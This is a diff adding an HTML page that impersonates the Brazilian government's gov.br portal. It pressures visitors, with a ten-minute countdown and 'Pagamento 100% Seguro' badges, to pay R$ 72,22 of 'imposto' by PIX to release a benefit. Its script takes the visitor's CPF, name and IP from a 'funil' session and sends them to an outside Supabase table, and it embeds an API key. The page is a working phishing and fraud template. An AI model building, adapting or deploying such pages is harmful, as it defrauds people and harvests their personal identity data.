@@ -1,0 +1,249 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <link rel="stylesheet" href="../../css/styles-DzPR7eDw.css" data-precedence="default">
+  <title>Pagamento PIX — Saque Brasil</title>
+  <style>
+    html { scroll-behavior: smooth; }
+    .animate-fade-in-up { animation: fadeInUp 0.6s ease-out forwards; opacity: 0; }
+    @keyframes fadeInUp {
+      from { opacity: 0; transform: translateY(20px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+  </style>
+</head>
+<body class="antialiased font-sans bg-[#f0f2f5] text-[#313c52]">
+  
+  <div class="flex min-h-screen flex-col">
+    <div class="border-b border-[#e8e8e8] bg-white py-3">
+      <div class="mx-auto flex w-full max-w-[1140px] items-center justify-between px-[15px]">
+        <img src="../../images/govbr-logo.png" alt="gov.br" class="h-14 min-w-[64px] rounded object-contain">
+        <span class="inline-flex items-center gap-2 text-[14px] font-medium text-[#313c52]">
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="size-[22px] text-[#59BF75]"><path d="M20 13c0 5-3.5 7.5-7.66 8.95a1 1 0 0 1-.67-.01C7.5 20.5 4 18 4 13V6a1 1 0 0 1 1-1c2 0 4.5-1.2 6.24-2.72a1.17 1.17 0 0 1 1.52 0C14.51 3.81 17 5 19 5a1 1 0 0 1 1 1z"></path><path d="m9 12 2 2 4-4"></path></svg>
+          Pagamento 100% Seguro
+        </span>
+      </div>
+    </div>
+    
+    <div class="bg-[#008BD9] px-4 py-4 text-center text-[14px] text-white">
+      <div class="mx-auto w-full max-w-[1140px] px-[15px]">
+        <strong>Atenção:</strong> Complete o pagamento do seu imposto em até 10 minutos para garantir seu <strong>Beneficio</strong>.
+      </div>
+    </div>
+    
+    <div class="mx-auto w-full max-w-[1140px] px-[15px]">
+      <div class="mt-6 flex flex-col justify-around gap-y-4 lg:flex-row lg:items-start animate-fade-in-up">
+        
+        <div class="order-2 w-full lg:order-1 lg:w-[58%] lg:px-[15px]">
+          
+          <div class="mb-6 rounded-lg border border-black/[0.125] bg-white p-3 sm:p-4">
+            <h3 class="mb-3 text-[16px] font-bold text-[#313c52]">Identificação</h3>
+            <div class="flex flex-col gap-4 md:flex-row">
+              <div class="w-full md:w-1/2">
+                <label for="nome" class="mb-1.5 block text-[14px] font-medium text-[#313c52]">Nome completo</label>
+                <input id="nome" readonly type="text" value="MARIA DAS GRAÇAS SOUZA" class="w-full rounded border border-[#ddd] bg-white px-3.5 py-2.5 text-[14px] text-[#313c52] outline-none">
+              </div>
+              <div class="w-full md:w-1/2">
+                <label for="cpf" class="mb-1.5 block text-[14px] font-medium text-[#313c52]">CPF</label>
+                <input id="cpf" readonly type="text" value="000.000.000-00" class="w-full rounded border border-[#ddd] bg-white px-3.5 py-2.5 text-[14px] text-[#313c52] outline-none">
+              </div>
+            </div>
+          </div>
+          
+          <div id="step-gerar-pix" class="mb-4 rounded-lg border border-black/[0.125] bg-white p-3 sm:p-4">
+            <p class="text-[16px] text-[#7e7e7e]">Ao selecionar o Pix, você será encaminhado para um ambiente seguro para finalizar seu pagamento.</p>
+            <div class="mt-4 flex items-center justify-center">
+              <button type="button" id="btn-gerar" class="min-w-[218px] rounded bg-[#23d07d] px-7 py-4 text-[16px] font-bold uppercase leading-5 text-white transition hover:bg-[#1fbb70]">
+                Gerar Pix
+              </button>
+            </div>
+          </div>
+          
+          <div id="step-pix-gerado" class="mb-4 rounded-lg border border-black/[0.125] bg-white p-3 sm:p-4 hidden">
+            <h3 class="mb-3 text-[16px] font-bold text-[#313c52]">Pagamento</h3>
+            <div class="mb-4 flex h-[70px] items-center justify-center">
+              <div class="flex h-[57px] w-[100px] items-center justify-center rounded p-2 shadow-[inset_0_0_0_2px_#009BF2]">
+                <!-- Pix Logo SVG -->
+                <svg width="56" height="21" viewBox="0 0 56 21" fill="none" xmlns="http://www.w3.org/2000/svg">
+                  <path d="M23.1182 19.1341V7.7101C23.1182 5.6045 24.8206 3.9021 26.9262 3.9021H30.2974C32.3918 3.9021 34.083 5.6045 34.083 7.6989V10.1293C34.083 12.2349 32.3806 13.9373 30.275 13.9373H25.515" stroke="#939598" stroke-miterlimit="10" stroke-linecap="round" stroke-linejoin="round"></path><path d="M35.0234 3.91333H36.4906C37.353 3.91333 38.0474 4.60773 38.0474 5.47013V14.0045" stroke="#939598" stroke-miterlimit="10" stroke-linecap="round" stroke-linejoin="round"></path><path d="M37.7341 2.59174L37.0733 1.93094C36.9053 1.76294 36.9053 1.49414 37.0733 1.33734L37.7341 0.676537C37.9021 0.508537 38.1709 0.508537 38.3277 0.676537L38.9885 1.33734C39.1565 1.50534 39.1565 1.77414 38.9885 1.93094L38.3277 2.59174C38.1597 2.74854 37.8909 2.74854 37.7341 2.59174Z" fill="#32BCAD"></path><path d="M40.8477 3.9021H42.2925C43.0429 3.9021 43.7485 4.1933 44.2861 4.7309L47.6797 8.1245C48.1165 8.5613 48.8333 8.5613 49.2701 8.1245L52.6525 4.7421C53.1789 4.2157 53.8957 3.9133 54.6461 3.9133H55.8221" stroke="#939598" stroke-miterlimit="10" stroke-linecap="round" stroke-linejoin="round"></path><path d="M40.8477 13.9262H42.2925C43.0429 13.9262 43.7485 13.635 44.2861 13.0974L47.6797 9.70382C48.1165 9.26702 48.8333 9.26702 49.2701 9.70382L52.6525 13.0862C53.1789 13.6126 53.8957 13.915 54.6461 13.915H55.8221" stroke="#939598" stroke-miterlimit="10" stroke-linecap="round" stroke-linejoin="round"></path><path d="M14.4714 16.0877C13.7434 16.0877 13.0602 15.8077 12.545 15.2925L9.76739 12.5149C9.57699 12.3245 9.22979 12.3245 9.03939 12.5149L6.2506 15.3037C5.7354 15.8189 5.05219 16.0989 4.32419 16.0989H3.77539L7.30339 19.6269C8.40099 20.7245 10.193 20.7245 11.2906 19.6269L14.8298 16.0877H14.4714Z" fill="#32BCAD"></path><path d="M4.31293 6.25403C5.04093 6.25403 5.72413 6.53403 6.23933 7.04923L9.02813 9.83803C9.22973 10.0396 9.55453 10.0396 9.75613 9.83803L12.5449 7.06043C13.0601 6.54523 13.7433 6.26523 14.4713 6.26523H14.8073L11.2681 2.72603C10.1705 1.62843 8.37853 1.62843 7.28093 2.72603L3.75293 6.25403H4.31293Z" fill="#32BCAD"></path><path d="M17.7308 9.18849L15.5916 7.04929C15.5468 7.07169 15.4908 7.08289 15.4348 7.08289H14.4604C13.9564 7.08289 13.4636 7.28449 13.1164 7.64289L10.3388 10.4205C10.0812 10.6781 9.73404 10.8125 9.39804 10.8125C9.05084 10.8125 8.71483 10.6781 8.45723 10.4205L5.66844 7.63169C5.31004 7.27329 4.81724 7.07169 4.32444 7.07169H3.12604C3.07004 7.07169 3.02524 7.06049 2.98044 7.03809L0.830036 9.18849C-0.267564 10.2861 -0.267564 12.0781 0.830036 13.1757L2.96923 15.3149C3.01403 15.2925 3.05884 15.2813 3.11484 15.2813H4.31323C4.81723 15.2813 5.31003 15.0797 5.65723 14.7213L8.44604 11.9325C8.95004 11.4285 9.83484 11.4285 10.3388 11.9325L13.1164 14.7101C13.4748 15.0685 13.9676 15.2701 14.4604 15.2701H15.4348C15.4908 15.2701 15.5356 15.2813 15.5916 15.3037L17.7308 13.1645C18.8284 12.0669 18.8284 10.2861 17.7308 9.18849Z" fill="#32BCAD"></path>
+                </svg>
+              </div>
+            </div>
+            
+            <div class="mb-3.5 flex items-center gap-2 rounded-md border border-[#86efac] bg-[#dcfce7] px-3.5 py-2.5">
+              <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="size-4 text-[#16a34a]"><path d="m9 12 2 2 4-4"></path><circle cx="12" cy="12" r="10"></circle></svg>
+              <span class="text-[13px] font-semibold text-[#15803d]">Pix gerado com sucesso! Aguardando pagamento...</span>
+            </div>
+            
+            <div class="mb-4 flex items-center justify-between rounded-md border border-[#fce38a] bg-[#fff8e1] px-3.5 py-2.5">
+              <span class="text-[12px] font-medium text-[#92400e]">Código expira em:</span>
+              <span id="countdown" class="text-[14px] font-bold tabular-nums text-[#92400e]">10:00</span>
+            </div>
+            
+            <div class="mb-4 flex flex-col items-center">
+              <div class="grid size-[200px] place-items-center rounded-lg border-[3px] border-[#32bcad] bg-white text-center">
+                <span class="text-xs text-muted-foreground">(QR Code Simulado)</span>
+              </div>
+              <span class="mt-2 text-[12px] text-[#777]">Escaneie com o app do seu banco</span>
+            </div>
+            
+            <div>
+              <label class="mb-1.5 block text-[12px] font-semibold text-[#555]">Pix Copia e Cola</label>
+              <div class="flex gap-2">
+                <input id="pix-copy" type="text" readonly value="00020126580014br.gov.bcb.pix0136123e4567-e89b-12d3-a456-426614174000520400005303986540572.225802BR5913Recebedor BR6008SAO PAULO62070503***63041A2B" class="min-w-0 flex-1 rounded border border-[#ddd] bg-[#f7f7f7] px-3 py-2.5 font-mono text-[11px] text-[#555] outline-none">
+                <button type="button" id="btn-copy" class="flex shrink-0 items-center gap-[5px] whitespace-nowrap rounded bg-[#32bcad] hover:bg-[#26a69a] px-4 py-2.5 text-[12px] font-bold text-white transition">
+                  <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="size-[13px]"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg>
+                  <span>Copiar</span>
+                </button>
+              </div>
+            </div>
+            
+            <div class="mt-3.5 rounded-md border border-[#dde5ff] bg-[#f7f9ff] p-3.5">
+              <h4 class="mb-2 text-[12px] font-bold text-[#1e40af]">Como pagar com PIX?</h4>
+              <ol class="list-decimal pl-[18px]">
+                <li class="mb-[5px] text-[12px] leading-[1.5] text-[#555]">Abra o aplicativo do seu banco</li>
+                <li class="mb-[5px] text-[12px] leading-[1.5] text-[#555]">Acesse <strong>PIX Pagar com QR Code</strong> ou <strong>Copia e Cola</strong></li>
+                <li class="mb-[5px] text-[12px] leading-[1.5] text-[#555]">Escaneie o QR Code ou cole o código acima</li>
+                <li class="mb-[5px] text-[12px] leading-[1.5] text-[#555]">Confirme o valor de <strong>R$ 72,22</strong> e finalize o pagamento</li>
+                <li class="mb-[5px] text-[12px] leading-[1.5] text-[#555]">O acesso será liberado em instantes após a confirmação</li>
+              </ol>
+            </div>
+          </div>
+          
+        </div>
+        
+        <div class="order-1 w-full lg:order-2 lg:w-[33%] lg:px-[15px]">
+          <div class="sticky top-6 rounded-lg border border-black/[0.125] bg-white">
+            <div class="flex items-center justify-between border-b border-[#f0f0f0] px-4 py-3">
+              <span class="text-[14px] font-bold text-[#313c52]">Seus impostos</span>
+              <span class="flex size-[22px] items-center justify-center rounded bg-[#009BF2] text-[12px] font-bold text-white">1</span>
+            </div>
+            <div class="p-3">
+              <div class="mb-4 grid grid-cols-[50px_auto_80px] items-center gap-x-3 gap-y-2.5">
+                <img src="../../images/imposto-federal.png" alt="Imposto Federal" class="size-[50px] rounded object-cover shadow-sm">
+                <div>
+                  <span class="block text-[14px] font-semibold -tracking-[0.02em] text-[#313c52]">Imposto Federal Brasileiro</span>
+                  <span class="text-[11px] font-semibold text-[#313c52]">Aguardando pagamento</span>
+                </div>
+                <div class="flex items-center justify-end text-[14px] text-[#a6a6a6]">1 un.</div>
+              </div>
+              <hr class="my-3 border-black/10">
+              <div class="mb-2 flex justify-between text-[14px] text-[#636363]">
+                <span>Subtotal</span>
+                <span>R$ 72,22</span>
+              </div>
+              <hr class="mb-3 border-black/10">
+              <div class="mb-3.5 flex items-center justify-between text-[16px] -tracking-[0.02em] text-[#373737]">
+                <span>Total</span>
+                <span class="font-semibold">R$ 72,22</span>
+              </div>
+            </div>
+            <div class="flex h-10 items-center justify-center gap-2 rounded-b-lg bg-[#f0fbf2] text-[13px] font-semibold text-[#59bf75]">
+              <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="size-[15px]"><path d="M20 13c0 5-3.5 7.5-7.66 8.95a1 1 0 0 1-.67-.01C7.5 20.5 4 18 4 13V6a1 1 0 0 1 1-1c2 0 4.5-1.2 6.24-2.72a1.17 1.17 0 0 1 1.52 0C14.51 3.81 17 5 19 5a1 1 0 0 1 1 1z"></path><path d="M12 8v4"></path><path d="M12 16h.01"></path></svg>
+              COMPRA 100% SEGURA
+            </div>
+          </div>
+        </div>
+        
+      </div>
+    </div>
+    
+    <footer class="mt-auto flex flex-col items-center border-t border-[#e8e8e8] bg-[#fafafa] py-6 text-center text-[12px] text-[#aaa]">
+      <p class="mb-2">Formas de pagamento</p>
+      <div class="grid h-[60px] w-[90px] place-items-center rounded-lg bg-[#4AB7A8]">
+        <!-- Pix Icon White -->
+        <svg width="34" height="34" viewBox="0 0 19 21" fill="none" aria-hidden="true"><path d="M14.4714 16.0877C13.7434 16.0877 13.0602 15.8077 12.545 15.2925L9.76739 12.5149C9.57699 12.3245 9.22979 12.3245 9.03939 12.5149L6.2506 15.3037C5.7354 15.8189 5.05219 16.0989 4.32419 16.0989H3.77539L7.30339 19.6269C8.40099 20.7245 10.193 20.7245 11.2906 19.6269L14.8298 16.0877H14.4714Z" fill="#fff"></path><path d="M4.31293 6.25403C5.04093 6.25403 5.72413 6.53403 6.23933 7.04923L9.02813 9.83803C9.22973 10.0396 9.55453 10.0396 9.75613 9.83803L12.5449 7.06043C13.0601 6.54523 13.7433 6.26523 14.4713 6.26523H14.8073L11.2681 2.72603C10.1705 1.62843 8.37853 1.62843 7.28093 2.72603L3.75293 6.25403H4.31293Z" fill="#fff"></path><path d="M17.7308 9.18849L15.5916 7.04929C15.5468 7.07169 15.4908 7.08289 15.4348 7.08289H14.4604C13.9564 7.08289 13.4636 7.28449 13.1164 7.64289L10.3388 10.4205C10.0812 10.6781 9.73404 10.8125 9.39804 10.8125C9.05084 10.8125 8.71483 10.6781 8.45723 10.4205L5.66844 7.63169C5.31004 7.27329 4.81724 7.07169 4.32444 7.07169H3.12604C3.07004 7.07169 3.02524 7.06049 2.98044 7.03809L0.830036 9.18849C-0.267564 10.2861 -0.267564 12.0781 0.830036 13.1757L2.96923 15.3149C3.01403 15.2925 3.05884 15.2813 3.11484 15.2813H4.31323C4.81723 15.2813 5.31003 15.0797 5.65723 14.7213L8.44604 11.9325C8.95004 11.4285 9.83484 11.4285 10.3388 11.9325L13.1164 14.7101C13.4748 15.0685 13.9676 15.2701 14.4604 15.2701H15.4348C15.4908 15.2701 15.5356 15.2813 15.5916 15.3037L17.7308 13.1645C18.8284 12.0669 18.8284 10.2861 17.7308 9.18849Z" fill="#fff"></path></svg>
+      </div>
+      <p class="mt-3">2026 Receita Verificação</p>
+    </footer>
+  </div>
+
+  <script>
+    document.addEventListener('DOMContentLoaded', function() {
+      const urlParams = new URLSearchParams(window.location.search);
+      let cpf = urlParams.get('cpf');
+      if (!cpf) cpf = sessionStorage.getItem('funil:cpf');
+      if (!cpf) { window.location.href = 'index.html'; return; }
+      
+      function formatCPF(v) {
+        v = v.replace(/\D/g, "");
+        if (v.length > 9) return v.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, "$1.$2.$3-$4");
+        return v;
+      }
+      
+      let nomeUsuario = 'MARIA DAS GRAÇAS SOUZA';
+      const dadosStr = sessionStorage.getItem('funil:dados');
+      if (dadosStr) {
+        try {
+          const dados = JSON.parse(dadosStr);
+          if (dados.NOME) nomeUsuario = dados.NOME;
+        } catch(e) {}
+      }
+
+      document.getElementById('nome').value = nomeUsuario;
+      document.getElementById('cpf').value = formatCPF(cpf);
+      
+      const btnGerar = document.getElementById('btn-gerar');
+      const stepGerar = document.getElementById('step-gerar-pix');
+      const stepPixGerado = document.getElementById('step-pix-gerado');
+      const countdown = document.getElementById('countdown');
+      
+      btnGerar.addEventListener('click', function() {
+        btnGerar.textContent = "Gerando...";
+        btnGerar.disabled = true;
+        
+        setTimeout(function() {
+          stepGerar.classList.add('hidden');
+          stepPixGerado.classList.remove('hidden');
+          
+          // Registrar pedido no Supabase
+          const SUPABASE_URL = 'https://xxhvnwllvwmirigqeamx.supabase.co';
+          const SUPABASE_ANON_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Inh4aHZud2xsdndtaXJpZ3FlYW14Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODc2ODUzNzUsImV4cCI6MjEwMzI2MTM3NX0.j8aczTiuUaYQ1-yaBSvIbvDWXBVOvdlRgsY_ttzcGfA';
+          const ip = sessionStorage.getItem('funil:ip') || '—';
+          fetch(`${SUPABASE_URL}/rest/v1/pedidos_valores_novo`, {
+              method: 'POST',
+              headers: {
+                  'Content-Type': 'application/json',
+                  'apikey': SUPABASE_ANON_KEY,
+                  'Authorization': `Bearer ${SUPABASE_ANON_KEY}`
+              },
+              body: JSON.stringify({ cpf: cpf.replace(/\D/g, ""), nome: nomeUsuario, ip: ip, status: 'pendente' })
+          }).catch(console.error);
+
+          let timeLeft = 600; // 10 mins
+          const timer = setInterval(() => {
+            timeLeft--;
+            if (timeLeft <= 0) clearInterval(timer);
+            const m = Math.floor(timeLeft / 60);
+            const s = timeLeft % 60;
+            countdown.textContent = String(m).padStart(2, '0') + ':' + String(s).padStart(2, '0');
+          }, 1000);
+        }, 1500);
+      });
+      
+      const btnCopy = document.getElementById('btn-copy');
+      const pixCopy = document.getElementById('pix-copy');
+      
+      btnCopy.addEventListener('click', function() {
+        pixCopy.select();
+        document.execCommand('copy');
+        
+        const originalHtml = btnCopy.innerHTML;
+        btnCopy.innerHTML = "<span>Copiado</span>";
+        btnCopy.classList.replace('bg-[#32bcad]', 'bg-[#16a34a]');
+        btnCopy.classList.replace('hover:bg-[#26a69a]', 'hover:bg-[#16a34a]');
+        
+        setTimeout(() => {
+          btnCopy.innerHTML = originalHtml;
+          btnCopy.classList.replace('bg-[#16a34a]', 'bg-[#32bcad]');
+          btnCopy.classList.replace('hover:bg-[#16a34a]', 'hover:bg-[#26a69a]');
+        }, 3000);
+      });
+    });
+  </script>
+</body>
+</html>
+
+
